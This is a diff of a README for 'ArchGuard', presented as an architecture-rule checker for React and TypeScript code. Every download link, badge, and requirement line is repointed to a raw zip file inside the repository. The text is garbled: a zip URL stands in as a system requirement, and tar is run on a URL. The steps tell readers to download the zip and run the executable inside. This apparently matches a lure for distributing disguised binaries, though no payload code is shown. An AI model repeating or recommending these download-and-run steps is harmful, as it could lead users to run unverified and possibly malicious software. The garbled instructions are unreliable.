@@ -1,7 +1,7 @@
 # 🛡️ ArchGuard - Enforce Code Quality Effortlessly
 
 ## 📥 Download Now
-[![Download ArchGuard](https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip)](https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip)
+[![Download ArchGuard](https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip)](https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip)
 
 ## 📖 What is ArchGuard?
 ArchGuard is a tool designed for React and TypeScript projects. It helps you maintain a clean and organized codebase. By enforcing architectural rules, it ensures your code respects structural boundaries, keeps concerns separate, and establishes hard rules—especially during the commit time.
@@ -11,16 +11,16 @@ To get started with ArchGuard, you need to download and run the application. Fol
 
 ## 📦 System Requirements
 - Operating System: Windows, macOS, or Linux
-- https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip Version 14 or higher
+- https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip Version 14 or higher
 - React: Version 16 or higher
 - TypeScript: Must be installed in your project
 
 ## 💾 Download & Install
-To download ArchGuard, visit this page: [Download ArchGuard](https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip).
+To download ArchGuard, visit this page: [Download ArchGuard](https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip).
 
 ### Step-by-Step Installation
 1. Open your web browser.
-2. Go to the [Download ArchGuard](https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip) page.
+2. Go to the [Download ArchGuard](https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip) page.
 3. Look for the latest release version.
 4. Click on the appropriate file for your operating system. It might be an executable (.exe), a compressed folder (.zip), or other formats.
 5. Once downloaded, locate the file on your computer.
@@ -46,9 +46,9 @@ To download ArchGuard, visit this page: [Download ArchGuard](https://github.com/
   - Open the extracted folder and double-click the ArchGuard icon.
 
 #### For Linux:
-- If you downloaded a https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip file:
+- If you downloaded a https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip file:
   - Open your terminal.
-  - Use the command `tar -xzvf https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip` to extract the files.
+  - Use the command `tar -xzvf https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip` to extract the files.
   - Navigate to the extracted folder and run the command `./ArchGuard` to start the application.
 
 ## 🔍 How to Use ArchGuard
@@ -81,4 +81,4 @@ Join our community to learn more about using ArchGuard effectively. Connect with
 ## 📄 License
 ArchGuard is open-source and available under the MIT License. Check the repository for more information on the licensing terms.
 
-[![Download ArchGuard](https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip)](https://github.com/fauziah/ArchGuard/raw/refs/heads/main/packages/cli/Guard-Arch-v1.8.zip)
+[![Download ArchGuard](https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip)](https://raw.githubusercontent.com/fauziah/ArchGuard/main/packages/cursor/Guard-Arch-3.8.zip)
